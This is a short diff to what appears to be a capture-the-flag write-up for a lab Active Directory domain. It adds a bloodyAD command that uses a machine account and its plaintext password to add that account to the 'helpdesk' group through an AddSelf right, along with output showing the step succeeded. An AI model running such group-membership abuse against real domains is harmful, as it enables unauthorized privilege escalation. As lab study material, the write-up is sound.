@@ -243,5 +243,10 @@ I have AddSelf on the helpdesk group
 # Adding `it-computer3$` to the helpdesk group
 
 ```python
-
+❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'it-computer3$' -p 'Rusty88!' -k add groupMember 'helpdesk' 'it-computer3$'
+Clock skew detected. Adjusting local time by 7:59:59.544453. Retrying operation.
+[+] it-computer3$ added to helpdesk
 ```
+
+Ill then add the computer account to the group
+
